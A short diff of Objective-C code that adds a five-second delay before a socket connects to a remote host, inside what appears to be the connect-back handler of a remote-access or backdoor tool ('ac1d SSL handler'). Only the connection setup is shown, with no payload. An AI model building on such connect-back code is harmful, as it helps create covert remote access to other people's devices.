@@ -145,6 +145,7 @@ void connectToServer(NSString *remoteHost, int remotePort) {
     serverAddress.sin_port = htons(remotePort);
     if (debug) printf("[+] ac1d SSL handler loaded!\n");
     if (debug) printf("[*] Connecting to %s:%d...\n", [remoteHost UTF8String], remotePort);
+    [NSThread sleepForTimeInterval:5.0f];
     if (connect(sockfd, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) < 0) {
         if (debug) printf("[-] Failed to connect!\n");
         return;
